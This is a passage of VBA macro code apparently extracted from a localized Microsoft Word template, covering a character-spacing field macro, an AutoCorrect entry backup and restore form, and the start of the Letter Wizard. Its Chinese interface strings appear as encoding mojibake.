MsgBox Err.Description, Title:=SZ_MACRONAME\nEnd Sub\n\n' *************************************\nFunction FIsSpace(wh$)\n    ch = AscW(wh$)\n    ' Space DBSpace EmSpace EnSpace 1/4EmSpace\n    If ch = 32 Or ch = 12288 Or ch = 8197 Or ch = 8194 Or ch = 8195 Then\n        FIsSpace = ch\n    Else\n        FIsSpace = 0\n    End If\nEnd Function\n\n\nSub Delete()\n    Dim rgn As Range\n    Dim rgnFld As Range\n    Dim rgnNew As Range\n    Dim fld As Field\n    Dim FUpdate As Boolean\n    \n    On Error GoTo LError\n    If (Application.ScreenUpdating = True) Then\n        FUpdate = True\n        Application.ScreenUpdating = False\n        System.Cursor = wdCursorWait\n    Else\n        FUpdate = False\n    End If\n    \n    With Selection\n        Set rgn = .Range\n        \n        If (.Fields.Count < 1) Then\n'            Create (Len(.Text) + 1)\n            Beep\n            GoTo LExit:\n        End If\n        For Each fld In rgn.Fields\n            a$ = fld.Code\n            Set rgnFld = fld.Code\n            If (FIsDistField(rgnFld.Text) = False) Then\n                GoTo LContinue:\n            End If\n            rgnFld.Select\n            \n            iTop = InStr(1, a$, \"(\") + rgnFld.Start\n            iEnd = rgnFld.End - (Len(rgnFld.Text) - InStr(1, a$, \",\u00a1@\") + 1)\n            rgnFld.SetRange iTop, iEnd\n            \n            .MoveLeft\n            Set rgnNew = Selection.Range\n            rgnNew.FormattedText = rgnFld.FormattedText\n            rgnNew.Font.DisableCharacterSpaceGrid = True\n            rgnNew.Select\n            .MoveRight\n            .MoveRight , 1, 1\n            .Delete\nLContinue:\n        Next fld\n        rgn.Select\n    End With\nLExit:\n    If (FUpdate = True) Then\n        Application.ScreenUpdating = True\n        System.Cursor = wdCursorNormal\n    End If\n    Exit Sub\nLError:\n    MsgBox Err.Description, Title:=SZ_MACRONAME\nEnd Sub\n\n\nSub Resize(fld As Field, iNew As Integer)\n    Application.ScreenUpdating = False\n    System.Cursor = wdCursorWait\n    On Error GoTo LError\n    With Selection\n        Dim rgn As Range\n        a$ = fld.Code\n        Set rgn = fld.Code\n        \n        iTop = rgn.End - (Len(a$) - InStr(1, a$, \",\u00a1@\"))\n        iEnd = rgn.End - (Len(a$) - InStr(1, a$, \")\") + 1)\n        rgn.SetRange iTop, iEnd\n        rgn.Text = String$(iNew, \"\u00a1@\")\n    End With\nLExit:\n    Application.ScreenUpdating = True\n    System.Cursor = wdCursorNormal\n    Exit Sub\nLError:\n    MsgBox Err.Description, Title:=SZ_MACRONAME\nEnd Sub\n\n\nFunction FIsDistField(szFld As String) As Boolean\n    FIsDistField = False\n    ' { eq \\o\\ad(foo,\u00a1@\u00a1@\u00a1@)}\n    '   ~~~~~~~~~        ~~~\n    If (Left$(szFld, 10) = \" eq \\o\\ad(\") And (Right$(szFld, 2) = \"\u00a1@)\") Then\n        FIsDistField = True\n    End If\nEnd Function\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nOption Explicit\n\n' START LOCALIZATION'\n Const StatMsg1 = \"\u00a5[\u00a4J\u00a6\u00db\u00b0\u00ca\u00ae\u00d5\u00a5\u00bf\u00b6\u00b5\u00a5\u00d8\u00a1G \"\n Const StatMsg2 = \" \u00a4\u00a7 \"\n Const StatMsg3 = \"\u00a5\u00bf\u00a6b\u00ab\u00d8\u00a5\u00df\u00bc\u00cb\u00a6\u00a1...\"\n Const StatMsg4 = \"\u00a5\u00bf\u00a6b\u00c0x\u00a6s...\"\n Const TagText = \"\u00a6\u00db\u00b0\u00ca\u00ae\u00d5\u00a5\u00bf\u00b6\u00b5\u00a5\u00d8\u00b3\u00c6\u00a5\u00f7\u00a4\u00e5\u00a5\u00f3\"\n Const szAppName = \"\u00a6\u00db\u00b0\u00ca\u00ae\u00d5\u00a5\u00bf\u00a4u\u00a8\u00e3\u00b6\u00b0\"\n Const szErrorMsg = \"\u00a6\u00b3\u00bf\u00f9\u00bb~\u00b5o\u00a5\u00cd\u00a1C\u00b1z\u00adn\u00a6A\u00b8\u00d5\u00a4@\u00a6\u00b8\u00b6\u00dc\u00a1H\"\n Const szACEntriesErrorMsg = \"\u00a6\u00b3\u00bf\u00f9\u00bb~\u00b5o\u00a5\u00cd\u00a1C \u00a4\u00e5\u00a5\u00f3\u00aa\u00ba\u00bc\u00cb\u00a6\u00a1\u00a5i\u00af\u00e0\u00a6\u00b3\u00b0\u00dd\u00c3D\u00a1C\"\n Const szWarnMsg = \"\u00b5{\u00a6\u00a1\u00b1N\u00b1q\u00b3\u00c6\u00a5\u00f7\u00a4\u00e5\u00a5\u00f3\u00a4\u00a4\u00a8\u00fa\u00a5X\u00c0x\u00a6s\u00aa\u00ba\u00a6\u00db\u00b0\u00ca\u00ae\u00d5\u00a5\u00bf\u00b6\u00b5\u00a5\u00d8\u00a1A\u00a5\u00d8\u00abe\u00a6\u00db\u00b0\u00ca\u00ae\u00d5\u00a5\u00bf\u00b6\u00b5\u00a5\u00d8\u00a4\u00a4\u00ac\u00db\u00a6P\u00a6W\u00ba\u00d9\u00aa\u00ba\u00b3\u00a1\u00a5\u00f7\u00b1N\u00b7|\u00b3Q\u00a8\u00fa\u00a5N\u00b1\u00bc\u00a1C\u00b1z\u00c1\u00d9\u00adn\u00c4~\u00c4\u00f2\u00b6\u00dc\u00a1H\"\n Const szFormatIncorrect = \"\u00b3o\u00a5\u00f7\u00a4\u00e5\u00a5\u00f3\u00aa\u00ba\u00bc\u00cb\u00a6\u00a1\u00a4\u00a3\u00acO\u00a5\u00bf\u00bdT\u00aa\u00ba\u00b3\u00c6\u00a5\u00f7\u00a4\u00e5\u00a5\u00f3\u00bc\u00cb\u00a6\u00a1\"\n Const szRestoreCompletemsg = \"\u00a4w\u00a7\u00b9\u00a6\u00a8\u00ad\u00ab\u00b7s\u00b8\u00fc\u00a4J\u00a1C\"\n' END LOCALIZATION'\n\n'***********   btnBackup_Click() ******************\n'\n' Hides the form, creates a new Word document, calls GetAutoCorrectEntries(),\n' adds the text \"AutoCorrect Backup Document\" at the top of the document,\n' and saves the document by calling SaveACDoc.\n'\n' Uses valuable y that doesn't do anything.\n\nPrivate Sub btnBackup_Click()\nDim Y As Integer\n\nAutocorrect.Hide\nApplication.ScreenUpdating = False\n\n'create new document\nApplication.Documents.Add\n   \n ' call GetAutoCorrectEntries() user defined\n  Y = GetAutoCorrectEntries()\n  \n' add Text to top of document\n With Selection\n    .SplitTable\n    .TypeText Text:=TagText\n    .TypeParagraph\n  End With\n  \n'add some formatting\n  With ActiveDocument.Sentences(1)\n    .Bold = True\n    .Font.Size = 14\n  End With\n\n' Save the Document,call SaveACDoc() user defined, close if successful\nApplication.StatusBar = StatMsg4\nIf SaveACDoc = True Then\n ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges\nEnd If\nApplication.ScreenUpdating = True\nAutocorrect.Show\nEnd Sub\n\nPrivate Sub btnClose_Click()\nAutocorrect.Hide\nEnd Sub\n\n'************* btnRestore_Click() **************\n'\n' First warns the user that this will replace their existing entries.\n' If they answer no it jumps to the end of the function.  Then displays\n' the FileOpen dialog box to get the name of an existing AutoCorrect backup\n' document (creating using the Backup button.)  Next calls OpenACDoc() to open\n' the file. If successful it calls RestoreACEntries(). Finally, it closes the document.\n'\n'\n'\nPrivate Sub btnRestore_Click()\nDim ACFileName, Title As String\nDim Style, Response, x As Integer\n\nAutocorrect.Hide\n\n' warn users about replaced entries...\nStyle = vbYesNo + vbInformation + vbDefaultButton2 ' Define buttons.\nTitle = szAppName\nResponse = MsgBox(szWarnMsg, Style, Title)\nIf Response = vbNo Then\n   'exit\n    GoTo bye:\nEnd If\n\n' bring up fileopen and get a name\nWith Dialogs(wdDialogFileOpen)\n    .Display\n    ACFileName = .Name\nEnd With\n\n' Open a Document,call OpenACDoc() user defined\nIf OpenACDoc(ACFileName) = True Then 'error\n    ' Restore Entries, call RestoreACEntries() user defined\n    x = RestoreACEntries()\n    ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges\nEnd If\n\nbye:\nAutocorrect.Show\nEnd Sub\n\nFunction RestoreACEntries()\nDim i, NumRows As Integer\nDim oDoc, oACorrect, oTable As Object\n\nDim szName As String\nDim szValue As String\nDim szRTF As String\n\nErr.Clear\nOn Error GoTo RestoreACEntriesErrors:\n\n    ' check for correct format\n    If ActiveDocument.Words(1) = TagText Then\n        Application.ScreenUpdating = False\n        \n        Set oDoc = ActiveDocument\n        Set oTable = oDoc.Tables(1)\n        Set oACorrect = Application.Autocorrect.Entries\n\n        NumRows = ActiveDocument.Tables(1).Rows.Count\n        Selection.GoTo What:=wdGoToTable, Which:=wdGoToFirst\n        Selection.MoveRight unit:=wdCell, Count:=3\n    \n        For i = 2 To NumRows\n            szName = Selection.Text\n            Selection.MoveRight unit:=wdCell\n            szValue = Selection.Text\n            Selection.MoveRight unit:=wdCell\n            szRTF = Selection.Text\n            If szRTF = \"False\" Then\n                Application.StatusBar = StatMsg1 & szName\n                oACorrect.Add Name:=szName, Value:=szValue\n            Else\n                Application.StatusBar = StatMsg1 & szName\n                Selection.MoveLeft unit:=wdCell\n                oACorrect.AddRichText szName, Selection.Range\n                Selection.MoveRight unit:=wdCell\n            End If\n            Selection.MoveRight unit:=wdCell\n        Next i\n        Application.ScreenUpdating = True\n        MsgBox szRestoreCompletemsg\n    Else\n        MsgBox szFormatIncorrect\n    End If\n    \n    \nRestoreACEntriesErrors:\nSelect Case Err.Number\n    Case 0:\n    ' no error\n    Case Else\n      MsgBox (szACEntriesErrorMsg & vbCr & Err.Number & \"  \" & Err.Description & \" \" & szName)\nEnd Select\n  \n    \nEnd Function\n\n'****** GetAutoCorrectEntries() ******\n'\n' Inserts each AutoCorrect entry into a Word document including the Value and whether\n' or not it is to include formatting.  Name is the current name of the entry,\n' Value is the text value of the entry, and RTF is a Boolean that is True if the entry\n' has \"formatted text\" checked.  Then converts the text into a table and adds a heading row to the table.\n'\n' x is used to loop through the AutoCorrect entries.\n' TotalACEntries is the number of AC entries.\n\nPrivate Function GetAutoCorrectEntries()\nDim x As Integer\nDim TotalACEntries As Integer\n\nTotalACEntries = Application.Autocorrect.Entries.Count\nFor x = 1 To TotalACEntries\n    With Selection\n         .TypeText Text:=Application.Autocorrect.Entries.item(x).Name\n         .TypeText vbTab\n           \n          'check for formatting and insert RTF text if necessary\n          If Application.Autocorrect.Entries.item(x).RichText = True Then\n               Application.Autocorrect.Entries(x).Apply Range:=Selection.Range\n          Else\n             .TypeText Text:=Application.Autocorrect.Entries.item(x).Value\n          End If\n           \n          .TypeText vbTab\n           .TypeText Text:=Application.Autocorrect.Entries.item(x).RichText\n          .TypeParagraph\n    End With\n    \n    'update status bar\n'   Application.StatusBar = StatMsg1 & X & StatMsg2 & TotalACEntries\n    Application.StatusBar = StatMsg1 & TotalACEntries & StatMsg2 & x\nNext x\n\n\n' convert to table\nApplication.StatusBar = StatMsg3\nSelection.HomeKey unit:=wdStory, Extend:=wdExtend\n\nSelection.ConvertToTable Separator:=wdSeparateByTabs, Format:=wdTableFormatSimple1,   ApplyBorders:=False, ApplyShading:=False, ApplyFont:=False, ApplyColor:=False,   ApplyHeadingRows:=False, ApplyLastRow:=False, ApplyFirstColumn:=False, ApplyLastColumn:=False,   AutoFit:=True\n\n' add row heading\nWith Selection\n    .MoveUp unit:=wdLine, Count:=1\n    .InsertRows 1\n    .TypeText Text:=\"Name\"\n    .MoveRight unit:=wdCell\n    .TypeText Text:=\"Value\"\n    .MoveRight unit:=wdCell\n    .TypeText Text:=\"RTF\"\n    .HomeKey unit:=wdStory\nEnd With\n    \n 'Selection.GoTo What:=wdGoToPage, Which:=wdGoToNext\n 'Selection.InsertBreak Type:=wdPageBreak\n    \nEnd Function\n\nPublic Function SaveACDoc()\nDim Style, Response As Integer\nDim Title As String\n\nSaveACDoc = True\nErr.Clear\nOn Error GoTo SaveACDocErrors\n\nActiveDocument.Save\n\nSaveACDocErrors:\nSelect Case Err.Number\n    Case 0:\n    ' no error\n    Case 4198:\n    ' cancel\n    SaveACDoc = False\n    Case Else\n      Style = vbYesNo + vbCritical + vbDefaultButton2 ' Define buttons.\n      \n      ' put error number and description in title of the message box\n      Title = Err.Number & \"  \" & Err.Description\n        \n      Response = MsgBox(szErrorMsg, Style, Title)\n      If Response = vbYes Then\n          Resume 'bring up SaveAs again\n      Else    ' User choose No.\n          SaveACDoc = False\n      End If\nEnd Select\n\nEnd Function\n\n\nPublic Function OpenACDoc(ByVal ACFileOpenName As String) As Boolean\n\nDim Style As Integer\n\nOpenACDoc = True\nErr.Clear\nOn Error GoTo OpenACDocErrors\n\nDocuments.Open FileName:=ACFileOpenName\n\nOpenACDocErrors:\nIf Err.Number <> 0 Then\n   OpenACDoc = False\nEnd If\n\nEnd Function\n\n\n\n\n'**************************************************\n' Letter Wizard\n' StartWizard Macro\n' %% Copyright c 1995 Microsoft Corporation\n'**************************************************\n\n'%% Universal DLL declarations\n'Declare Function FindWindow Lib \"user.exe\"(lpClassName$, lpWinName$) As 'Integer Alias \"FindWindow\"\n'Declare Function WinHelp Lib \"user.exe\"(hWnd As Integer, lpHelpFile$, 'wCommand As Integer, dwData As Long) As Integer Alias \"WinHelp\"\nPrivate Declare Function FindWindow Lib \"user32.dll\" Alias \"FindWindowA\" (ByVal lpClassName$, ByVal lpWinName$) As Long\nPrivate Declare Function WinHelp Lib \"user32.dll\" Alias \"WinHelpA\" (ByVal hwnd As Long, ByVal lpHelpFile$, ByVal wCommand As Long, ByVal dwData As Long) As Long\n\n'%% Universal shared variables %%\nPublic State, LastState\nPublic StateItems__()\nPublic dlg As Object\nPublic HideFilePreview__()\nPublic wizname$\nPublic iWorkDoc, iEmptyDoc, workDoc$, emptyDoc$\nPublic HelpCtx\nPublic gDoogie\n\n'%% Wizard-specific shared variables %%\nPublic LettersPath$        'Path to prewritten business letters (LETTERS-PATH)\nPublic LetterMax   'Number of letters\nPublic LetterNames__$() 'Names of letters\nPublic LetterFiles__$()    'Filenames of letters\nPublic defLttr     'Default category and letter\nPublic RetAddressLines 'DAPFEL\nPublic gEnvelopeLabel\nPublic dlgEL As Object\nPublic toui As Object\nPublic gPrewrittenFile$\nPublic gCurrentHeadingPosition, rtDistToLftDist\nPublic RetAddress__$() 'Return Address Array (max 5)\n'%% Strings galore\nPublic kThing$, kUpThing$, kWizname$, Wizard_$, Normal_$, kGallery$\nPublic kErrBadDoc$, kTip$, kLetterPath$, kLettersDir$, kLongLettersDir$\nPublic kSetupDialog$, kCreatingDoc$, kSaveSettings$, kRstSettings$\nPublic kRstStylsheet$, kLookingForLetters$, kLoadingLetterDetails$, kLookingFor$, kEnterRecipientAddress$\nPublic chQuote$, kAddressATEntry$\nPublic Dot_$, Letter_$, kRE$, kAccountID$, kDear$, kRecipient$, kTypeHere$, TPath$, kName$\nPublic kClosePersonal$, kCloseBusiness$, kWritersInitials$, kTypistsInitials$\nPublic kCC$, kNames$, kEnclosures$, kNumber$, kAttachments$, kFormalDateFormat$, kPage$, kEmptyMacro$, kInsertAddress$, kMacroButton$\nPublic kErrLetterNotFound$, kErrThatLetterNotFound$\nPublic kErrStyleNotFound1$, kErrStyleNotFound2$, kErrCannotCreate1$, kErrCannotCreate2$\nPublic kTypeCompanyName$\nPublic kFntArial$, kFntWndngs$, kDfltPageNum$\nPublic pt90_$, pt72_$, pt216_$, kFtrDist1$, kFtrDist2$\nPublic kErrMaxLines$\nPublic cntmplet$, proflett$, eleglett$\nPublic kStyCmpnyName$, kStyBodyText$, kStyRetAddr$, kStyCC$, kStyEncl$, kStySigName$, kStySal$, kStySubjLine$, kStyDate$, kStyInsideAddr$, kStyRefIntls$\nPublic Const strERR_WIZ_NOT_FOUND   As String = \"Word \u00a6b\u00a8\u00cf\u00a5\u00ce\u00aa\u00cc\u00bdd\u00a5\u00bb\u00aa\u00ba\u00b3]\u00a9w\u00b8\u00f4\u00ae|\u00b8\u00cc\u00a1A\u00a7\u00e4\u00a4\u00a3\u00a8\u00ec\u00a5\u00bb\u00ba\u00eb\u00c6F\u00a1C\"\nPublic Const strWizShortName = \"Cletter\"\n\nRem\nRem ======== InitStrings ========\nRem Please read LocNotes before localizing!\nRem\nPrivate Sub InitStrings()\nDim kRstStylesheet$\n\nRem Name of wizard & document/object produced\n    kThing$ = \"\u00ad^\u00a4\u00e5\u00abH\u00a5\u00f3\"\n    kUpThing$ = \"\u00ad^\u00a4\u00e5\u00abH\u00a5\u00f3\"\n    kWizname$ = \"\u00ad^\u00a4\u00e5\u00abH\u00a5\u00f3\u00ba\u00eb\u00c6F\"\n    WordBasic.PrintStatusBar \"\u00b1\u00d2\u00b0\u00ca\" + kWizname$ + \"...\"\n    Wizard_$ = kWizname$ 'Should be name as it appears in FileNew (change if different)\n    Normal_$ = \"normal\" 'normal template\n    kPage$ = \"  Page \"\n    kName$ = \"\u00a6b\u00a6\u00b9\u00b3B\u00bf\u00e9\u00a4J\u00a9m\u00a6W\"\n    kEmptyMacro$ = \"EmptyMacro \"\n    kGallery$ = \"Gallery Example\"\n    kInsertAddress$ = \"InsertAddress\" 'Used to check if MAPI is present\n    kMacroButton$ = \"MACROBUTTON \"\nRem Default address stored as AT Entry. used to check if user has entered an address in prewritten business letters\n    kAddressATEntry$ = \"Company Name\" + Chr(13) + \"Street Address\" + Chr(13) + \"City, State/Province  Zip/Postal\"\n    kEnterRecipientAddress$ = \"  \u00a6b\u00a6\u00b9\u00b3B\u00bf\u00e9\u00a4J\u00a6\u00ac\u00a5\u00f3\u00a4H\u00a6a\u00a7} \"\nRem Fonts\n    kFntArial$ = \"Arial\"\n    kFntWndngs$ = \"Wingdings\"\n    kDfltPageNum$ = \"l\"\nRem Misc strings\n    kErrBadDoc$ = \"\u00ba\u00eb\u00c6F\u00b5L\u00aak\u00a8\u00cf\u00a5\u00ce\u00b2{\u00a6\u00e6\u00a4\u00e5\u00a5\u00f3\u00a1C\u00adY\u00adn\u00b0\u00f5\u00a6\u00e6\u00ba\u00eb\u00c6F\u00a1A\u00bd\u00d0\u00bf\u00ef\u00a1u\u00c0\u00c9\u00ae\u00d7\u00a1v\u00a1u\u00b6}\u00b7s\u00c0\u00c9\u00ae\u00d7\u00a1v\u00a1A\u00a6A\u00bf\u00ef\u00a8\u00fa\" + Wizard_$ + \"\u00a1C\"\n    kTip$ = \"\u00b4\u00a3\u00a5\u00dc:\"\n    kLetterPath$ = \"letters-path\" 'optional .ini file setting\nRem Banter strings\n    kSetupDialog$ = \"\u00a5\u00bf\u00a6b\u00b3]\u00a9w\u00b9\u00ef\u00b8\u00dc\u00a4\u00e8\u00b6\u00f4...\"\n    kCreatingDoc$ = \"\u00a5\u00bf\u00a6b\u00ab\u00d8\u00a5\u00df\u00a4\u00e5\u00a5\u00f3...\"\n    kSaveSettings$ = \"\u00a5\u00bf\u00a6b\u00c0x\u00a6s\u00b3]\u00a9w...\"\n    kRstSettings$ = \"\u00a5\u00bf\u00a6b\u00c1\u00d9\u00ad\u00ec\u00b3]\u00a9w...\"\n    kRstStylesheet$ = \"\u00a5\u00bf\u00a6b\u00c1\u00d9\u00ad\u00ec\u00bc\u00cb\u00a6\u00a1...\"\n    kLookingForLetters$ = \"\u00a5\u00bf\u00a6b\u00b4M\u00a7\u00e4\u00abH\u00a5\u00f3...\"\n    kLoadingLetterDetails$ = \"\u00a5\u00bf\u00a6b\u00b8\u00fc\u00a4J\u00abH\u00a5\u00f3\u00b2\u00d3\u00b8`...\"\n    kLookingFor$ = \"\u00b4M\u00a7\u00e4\" '--> 'Looking for \"somefile.dot\"...'\n    chQuote$ = Chr(34)  ' \"\nRem Style strings\n    kStyCmpnyName$ = \"Company Name\"\n    kStyBodyText$ = \"Body Text Keep\"\n    kStyRetAddr$ = \"Return Address\"\n    kStyInsideAddr$ = \"Inside Address\"\n    kStyCC$ = \"CC\"\n    kStyEncl$ = \"Enclosure\"\n    kStySigName$ = \"Signature Name\"\n    kStySal$ = \"Salutation\"\n    kStySubjLine$ = \"Subject Line\"\n    kStyDate$ = \"Date\"\n    kStyRefIntls$ = \"Reference Initials\"\nRem == Other strings specific to this wizard ==\n    Letter_$ = \"letter\"  'Prefix for wizard stylesheets (eg, Letter1.dot)\n    Dot_$ = \".dot\"\n    kRE$ = \"Subject: \"\n    kAccountID$ = \"\u00b9q\u00a4l\u00b6l\u00a5\u00f3\u00b1b\u00b8\u00b9/\u00a4\u00e5\u00a5\u00f3\u00c3\u00d1\u00a7O\u00bdX\"\n    kDear$ = \"Dear \"\n    kTypeHere$ = \"\u00a6b\u00a6\u00b9\u00b3B\u00bf\u00e9\u00a4J\u00abH\u00a5\u00f3\u00a4\u00ba\u00aee\"\n    kRecipient$ = \"  \u00a6b\u00a6\u00b9\u00b3B\u00bf\u00e9\u00a4J\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc\u00a9m\u00a6W  \"\n    kClosePersonal$ = \"Yours truly,\"\n    kCloseBusiness$ = \"Sincerely,\"\n    kWritersInitials$ = \"  \u00a6b\u00a6\u00b9\u00b3B\u00bf\u00e9\u00a4J\u00b1H\u00a5\u00f3\u00aa\u00cc\u00a9m\u00a6W\u00c1Y\u00bcg  \"\n    kTypistsInitials$ = \"  \u00a6b\u00a6\u00b9\u00b3B\u00bf\u00e9\u00a4J\u00bds\u00c2\u00b5\u00aa\u00cc\u00a9m\u00a6W\u00c1Y\u00bcg  \"\n    kCC$ = \"Cc: \"\n    kNames$ = \"  \u00a6b\u00a6\u00b9\u00b3B\u00bf\u00e9\u00a4J\u00a9m\u00a6W  \"\n    kEnclosures$ = \"Enclosures: \"\n    kNumber$ = \"  \u00a6b\u00a6\u00b9\u00b3B\u00bf\u00e9\u00a4J\u00b8\u00b9\u00bdX  \"\n    kAttachments$ = \"Attachments\"\n    kFormalDateFormat$ = \"MMMM d, yyyy\"\nRem Measurements\n    pt90_$ = \"90pt\"\n    pt72_$ = \"72pt\"\n    pt216_$ = \"216pt\"\n    kFtrDist1$ = \"0.5\"  ' Used in DoStyleMerge\n    kFtrDist2$ = \"0.93\" ' Used in DoStyleMerge\nRem Error messages\n    kErrLetterNotFound$ = \"\u00a7\u00e4\u00a4\u00a3\u00a8\u00ec\u00b9w\u00b3]\u00abH\u00a5\u00f3\u00a1C\"\n    kErrThatLetterNotFound$ = \"\u00a7\u00e4\u00a4\u00a3\u00a8\u00ec\u00b9w\u00b3]\u00abH\u00a5\u00f3\u00a1C\u00bd\u00d0\u00b0\u00f5\u00a6\u00e6\u00a6w\u00b8\u00cb\u00b5{\u00a6\u00a1\u00a8\u00c3\u00bf\u00ef\u00a8\u00fa\u00abH\u00a5\u00f3\u00bdd\u00a8\u00d2\u00a1C\" 'wizard cannot find this letter. Please choose another.\"\n    kErrLetterNotFound$ = \"\u00a7\u00e4\u00a4\u00a3\u00a8\u00ec\u00b9w\u00b3]\u00abH\u00a5\u00f3\u00a1C\"\n    kErrThatLetterNotFound$ = \"\u00ba\u00eb\u00c6F\u00a7\u00e4\u00a4\u00a3\u00a8\u00ec\u00a6\u00b9\u00abH\u00a5\u00f3\u00a1A\u00bd\u00d0\u00bf\u00ef\u00a8\u00fa\u00a8\u00e4\u00a5\u00a6\u00abH\u00a5\u00f3\u00a1C\"\n    kErrStyleNotFound1$ = \"\u00ba\u00eb\u00c6F\u00a7\u00e4\u00a4\u00a3\u00a8\u00ec\u00bc\u00cb\u00a6\u00a1\u00bdd\u00a5\u00bb\"\n    kErrStyleNotFound2$ = \"\u00a1C\"\n    kErrCannotCreate1$ = \"\u00ba\u00eb\u00c6F\u00b5L\u00aak\u00ab\u00d8\u00a5\u00df\u00abH\u00a5\u00f3\u00a1A\u00a6]\u00ac\u00b0'\"\n    kErrCannotCreate2$ = \"' \u00a4\u00a3\u00a6s\u00a6b\u00a1C\"\n    kTypeCompanyName$ = \"\u00bf\u00e9\u00a4J\u00a4\u00bd\u00a5q\u00a6W\u00ba\u00d9\"\n    kErrMaxLines$ = \"\u00a6^\u00abH\u00a6a\u00a7}\u00a4\u00a3\u00a5i\u00b6W\u00b9L\u00a4\u00ad\u00a6\u00e6\u00a1C\"\nEnd Sub 'InitStrings\n\n\n\n\n'%% StartWizard Macro %%\nPublic Sub Main()\nReDim StateItems__(12)\nReDim HideFilePreview__(12)\nReDim LetterNames__$(18)\nReDim LetterFiles__$(18)\nReDim RetAddress__$(8)\nDim p$\nDim x\nDim iWindowNumber\nDim faddr As String, freaddr As String\n    \nState = 0\nLastState = 0\nSet dlg = WordBasic.DialogRecord.UserDialog(False)\nwizname$ = \"\"\niWorkDoc = 0\niEmptyDoc = 0\nworkDoc$ = \"\"\nemptyDoc$ = \"\"\nHelpCtx = 0\ngDoogie = 0\nLettersPath$ = \"\"\nLetterMax = 0\ndefLttr = 0\nRetAddressLines = 0\ngEnvelopeLabel = 0\nSet dlgEL = WordBasic.DialogRecord.ToolsEnvelopesAndLabels(False)\nSet toui = WordBasic.DialogRecord.ToolsOptionsUserInfo(False)\ngPrewrittenFile$ = \"\"\ngCurrentHeadingPosition = 0\nrtDistToLftDist = 0\nkThing$ = \"\"\nkUpThing$ = \"\"\nkWizname$ = \"\"\nWizard_$ = \"\"\nNormal_$ = \"\"\nkGallery$ = \"\"\nkErrBadDoc$ = \"\"\nkTip$ = \"\"\nkLetterPath$ = \"\"\nkLettersDir$ = \"\"\nkLongLettersDir$ = \"\"\nkSetupDialog$ = \"\"\nkCreatingDoc$ = \"\"\nkSaveSettings$ = \"\"\nkRstSettings$ = \"\"\nkRstStylsheet$ = \"\"\nkLookingForLetters$ = \"\"\nkLoadingLetterDetails$ = \"\"\nkLookingFor$ = \"\"\nkEnterRecipientAddress$ = \"\"\nchQuote$ = \"\"\nkAddressATEntry$ = \"\"\nDot_$ = \"\"\nLetter_$ = \"\"\nkRE$ = \"\"\nkAccountID$ = \"\"\nkDear$ = \"\"\nkRecipient$ = \"\"\nkTypeHere$ = \"\"\nTPath$ = \"\"\nkName$ = \"\"\nkClosePersonal$ = \"\"\nkCloseBusiness$ = \"\"\nkWritersInitials$ = \"\"\nkTypistsInitials$ = \"\"\nkCC$ = \"\"\nkNames$ = \"\"\nkEnclosures$ = \"\"\nkNumber$ = \"\"\nkAttachments$ = \"\"\nkFormalDateFormat$ = \"\"\nkPage$ = \"\"\nkEmptyMacro$ = \"\"\nkInsertAddress$ = \"\"\nkMacroButton$ = \"\"\nkErrLetterNotFound$ = \"\"\nkErrThatLetterNotFound$ = \"\"\nkErrStyleNotFound1$ = \"\"\nkErrStyleNotFound2$ = \"\"\nkErrCannotCreate1$ = \"\"\nkErrCannotCreate2$ = \"\"\nkTypeCompanyName$ = \"\"\nkFntArial$ = \"\"\nkFntWndngs$ = \"\"\nkDfltPageNum$ = \"\"\npt90_$ = \"\"\npt72_$ = \"\"\npt216_$ = \"\"\nkFtrDist1$ = \"\"\nkFtrDist2$ = \"\"\nkErrMaxLines$ = \"\"\ncntmplet$ = \"\"\nproflett$ = \"\"\neleglett$ = \"\"\nkStyCmpnyName$ = \"\"\nkStyBodyText$ = \"\"\nkStyRetAddr$ = \"\"\nkStyCC$ = \"\"\nkStyEncl$ = \"\"\nkStySigName$ = \"\"\nkStySal$ = \"\"\nkStySubjLine$ = \"\"\nkStyDate$ = \"\"\nkStyInsideAddr$ = \"\"\nkStyRefIntls$ = \"\"\n    \n    kLettersDir$ = \"letters\\\"   'letters subdirectory - localize\n    kLongLettersDir$ = \"\u00abH\u00a5\u00f3\u00b6\u00c7\u00afu\\\"\n    WordBasic.WaitCursor 1  'This'll take a little while\n    InitStrings\n    'Get the templates directory. The templates are supposed to be in the same directory as that of the wizard\n    Dim TempDlg As Object: Set TempDlg = WordBasic.DialogRecord.FileTemplates(False)\n    WordBasic.CurValues.FileTemplates TempDlg\n    p$ = TempDlg.Template\n    If p$ = \"\" Then 'user might be creating a new template. Look at the default directory for style templates\n        TPath$ = StrWizardPath\n        If WordBasic.[Right$](TPath$, 1) <> \"\\\" Then TPath$ = TPath$ + \"\\\"\n        If WordBasic.[Files$](TPath$ + kLongLettersDir$ + \"*\" + Dot_$) = \"\" Then\n            TPath$ = TPath$ + kLettersDir$ 'short name\n        Else\n            TPath$ = TPath$ + kLongLettersDir$\n        End If\n    Else\n        TPath$ = WordBasic.[FileNameInfo$](p$, 5)\n    End If\n    \n    'TPath$ = \"C:\\Program Files\\Microsoft Office\\Templates\\\u00abH\u00a5\u00f3\u00b6\u00c7\u00afu\\\"\n    Rem Names of templates for style merges\n    If WordBasic.[Right$](TPath$, 1) <> \"\\\" Then TPath$ = TPath$ + \"\\\"\n    cntmplet$ = TPath$ + \"\u00b2{\u00a5N\u00a6\u00a1\u00abH\u00a5\u00f3.dot\"\n    If WordBasic.[Files$](cntmplet$) = \"\" Then cntmplet$ = TPath$ + \"letter1.dot\"\n        \n    proflett$ = TPath$ + \"\u00b1M\u00b7~\u00a6\u00a1\u00abH\u00a5\u00f3.dot\"\n    If WordBasic.[Files$](proflett$) = \"\" Then proflett$ = TPath$ + \"letter3.dot\"\n    \n    eleglett$ = TPath$ + \"\u00a8\u00e5\u00b6\u00ae\u00a6\u00a1\u00abH\u00a5\u00f3.dot\"\n    If WordBasic.[Files$](eleglett$) = \"\" Then eleglett$ = TPath$ + \"letter2.dot\"\n\n    rtDistToLftDist = 1.25 'Used in DateTabPlace$ in CreateLetter\n    VerifyEnvirons\n    GetPrewrittenDetails\n    WordBasic.PrintStatusBar kSetupDialog$\n\n    WordBasic.BeginDialog 558, 252, kWizname$, \"StartWizard.DlgControl\"\n\n    'General controls, 0-7 (hands off!)\n        WordBasic.Picture 2, 216, 500, 11, \"LinePic\", 1, \"LinePicA\" 'Workaround odd picture bug --\n        WordBasic.Picture 130, 216, 416, 11, \"LinePic\", 1, \"LinePicB\" ' use two copies to go 